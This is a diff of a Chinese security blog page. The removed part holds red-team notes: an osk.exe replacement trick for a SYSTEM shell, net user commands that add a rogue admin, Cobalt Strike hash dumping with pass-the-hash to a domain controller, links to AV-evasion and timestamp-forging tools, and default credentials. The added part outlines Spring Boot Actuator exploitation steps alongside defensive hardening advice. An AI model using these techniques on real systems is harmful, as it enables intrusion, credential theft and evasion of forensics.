-<p>21.通过老毛桃的win pe进入系统，这里重命名cmd.exe为osk.exe将原来C盘中的\windows\system32\osk.exe给覆盖了，这样子在开机的时候打开屏幕键盘就会弹出SYSTEM权限的命令行。</p>
-<p>22.通过命令查询，发现还原的系统是域普通主机，这里通过命令添加用并将域用户修改密码后添加到本地管理员组成功进入了系统。</p>
-<p>net user   hanli  quer1345 @  &#x2F;add</p>
-<p>net localgroup administrators  hanli  &#x2F;add</p>
-<p>23.在虚拟机中通过执行cs的后门成功上线，并通过cs的hasdump读取hash,并通过该hash进行域控HASH传递</p>
-<h2 id="免杀项目："><a href="#免杀项目：" class="headerlink" title="免杀项目："></a>免杀项目：</h2><p><a target="_blank" rel="noopener" href="https://github.com/wangfly-me/LoaderFly">https://github.com/wangfly-me/LoaderFly</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Pizz33/Qianji">https://github.com/Pizz33/Qianji</a></p>
-<p>可以定期去github上关注一些好用的bof</p>
-<h1 id="应对技巧："><a href="#应对技巧：" class="headerlink" title="应对技巧："></a>应对技巧：</h1><p>1.上传的木马都是新的</p>
-<p>​	可以查看更改时间和最近操作得到，得到直接保存沙盒删除溯源一条龙</p>
-<p>注：<a target="_blank" rel="noopener" href="https://github.com/MsF-NTDLL/ChTimeStamp">https://github.com/MsF-NTDLL/ChTimeStamp</a></p>
-<p>该项目可以实现修改文件时间</p>
-<h1 id="默认口令："><a href="#默认口令：" class="headerlink" title="默认口令："></a>默认口令：</h1><p>系统管理员：system&#x2F;system<br>    集团管理员(A8-v5集团版) group-admin&#x2F;123456<br>    单位管理员(A8-V5企业版) admin1&#x2F;admin123456<br>    审计管理员(所有版本) audit-admin&#x2F;seeyon123456</p>
+</li>
+<li><strong>版本依赖关系</strong>：<br><strong>Spring Cloud与Boot版本兼容表</strong>：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">Spring Cloud</th>
+<th align="left">Spring Boot</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Edgware</td>
+<td align="left">1.5.x (不兼容2.x)</td>
+</tr>
+<tr>
+<td align="left">Finchley</td>
+<td align="left">2.0.x</td>
+</tr>
+<tr>
+<td align="left">Hoxton</td>
+<td align="left">2.2.x-2.3.x</td>
+</tr>
+</tbody></table>
+<h4 id="2-敏感端点检测"><a href="#2-敏感端点检测" class="headerlink" title="2. 敏感端点检测"></a>2. <strong>敏感端点检测</strong></h4><ul>
+<li><strong>高风险端点</strong>：</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/env            # 环境变量与配置</span><br><span class="line">/jolokia/list   # 列出所有MBean</span><br><span class="line">/heapdump       # 下载堆内存快照（含敏感数据）</span><br><span class="line">/trace          # 查看HTTP请求记录（含Cookie）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>信息泄露验证</strong>：<br>检查<code>/v2/api-docs</code>是否返回API JSON结构；访问<code>/swagger-ui.html</code>确认接口详情。</li>
+</ul>
+<h4 id="3-漏洞利用验证流程"><a href="#3-漏洞利用验证流程" class="headerlink" title="3. 漏洞利用验证流程"></a>3. <strong>漏洞利用验证流程</strong></h4><ol>
+<li><strong>信息收集</strong>：<ul>
+<li>访问<code>/env</code>搜索<code>password</code>、<code>secret</code>等关键词。</li>
+<li>检查<code>******</code>字段，尝试Jolokia明文提取。</li>
+</ul>
+</li>
+<li><strong>RCE触发</strong>：<ul>
+<li>修改环境变量（如<code>spring.datasource.url</code>注入恶意JDBC）。</li>
+<li>调用<code>/refresh</code>或<code>/restart</code>生效配置。</li>
+</ul>
+</li>
+<li><strong>内存分析</strong>：<ul>
+<li>下载<code>/heapdump</code>，使用MAT工具分析内存中的密码明文。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="四、防御建议"><a href="#四、防御建议" class="headerlink" title="四、防御建议"></a><strong>四、防御建议</strong></h3><ol>
+<li><strong>端点管控</strong>：<ul>
+<li>生产环境关闭Actuator或通过<code>management.endpoints.web.exposure.include</code>限制暴露端点。</li>
+</ul>
+</li>
+<li><strong>依赖安全</strong>：<ul>
+<li>避免使用有漏洞的组件（如XStream &lt; 1.4.17、SnakeYAML &lt; 1.31）。</li>
+</ul>
+</li>
+<li><strong>配置加固</strong>：<ul>
+<li>重命名敏感端点路径（如<code>management.endpoints.web.path-mapping.env=internal-env</code>）。</li>
+<li>启用Spring Security对Actuator端点鉴权。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="五、学习资源"><a href="#五、学习资源" class="headerlink" title="五、学习资源"></a><strong>五、学习资源</strong></h3><ol>
+<li><p><strong>漏洞项目</strong>：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">LandGrey&#x2F;SpringBootVulExploit</a>：含漏洞环境与PoC。</li>
+</ul>
+</li>
+<li><p><strong>深度分析</strong>：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.cn/developer/article/2278104">Spring {Boot, Data, Security}历史漏洞研究</a>：漏洞原理与调试方法。</li>
+</ul>
+</li>
+<li><p><strong>实验环境</strong>：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/spring-boot-actuator">vulhub&#x2F;spring-boot-actuator</a></li>
+</ul>
+</li>
+<li><p><strong>推荐工具</strong>：</p>
+<ol>
+<li><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a target="_blank" rel="noopener" href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6></li>
+<li><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a target="_blank" rel="noopener" href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6></li>
+<li><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a target="_blank" rel="noopener" href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6></li>
+</ol>
+</li>
+<li><p><strong>常见案列</strong>：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/yunli0/article/details/117817987">10个Spring Boot 优秀学习项目_springboot项目</a></li>
+</ol>
+</li>
+</ol>
+<p>此框架覆盖了Spring Boot漏洞的核心场景，从原理到实践形成闭环，可作为渗透测试和安全加固的标准化参考。</p>
+</blockquote>
 
     </div>
 
@@ -537,21 +471,18 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Computer-info/" rel="tag"># Computer-info</a>
+              <a href="/tags/article/" rel="tag"># article</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/04/23/%E5%91%BD%E4%BB%A4%E7%9A%84%E7%86%9F%E6%82%89/" rel="prev" title="命令的熟悉">
-                  <i class="fa fa-angle-left"></i> 命令的熟悉
+                <a href="/2025/06/05/Guid-v1%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/" rel="prev" title="Guid-v1参数">
+                  <i class="fa fa-angle-left"></i> Guid-v1参数
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/04/24/payload%E8%AE%B0%E5%BD%95/" rel="next" title="payload记录">
-                  payload记录 <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
